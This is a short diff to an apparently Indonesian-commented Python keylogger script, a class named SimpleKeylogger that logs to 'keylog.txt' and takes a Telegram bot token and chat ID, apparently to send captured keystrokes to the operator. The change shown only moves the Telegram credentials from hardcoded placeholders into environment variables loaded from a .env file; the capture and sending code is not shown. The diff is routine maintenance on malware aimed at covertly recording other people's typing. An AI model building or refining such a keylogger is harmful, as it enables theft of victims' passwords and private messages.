@@ -4,6 +4,10 @@ import sys
 import os
 import requests
 import threading
+from dotenv import load_dotenv
+
+# Load environment variables from .env file
+load_dotenv()
 
 class SimpleKeylogger:
     def __init__(self, filename="keylog.txt", telegram_token=None, telegram_chat_id=None):
@@ -195,8 +199,9 @@ def main():
 
     # ===== KONFIGURASI TELEGRAM =====
     # Ganti dengan token dan chat ID Anda
-    TELEGRAM_TOKEN = "token"  # Ganti dengan token bot Anda
-    TELEGRAM_CHAT_ID = "chat_id"  # Ganti dengan chat ID Anda
+    # Ambil dari environment variable
+    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
     # Alternatif: gunakan environment variable untuk keamanan
     # import os
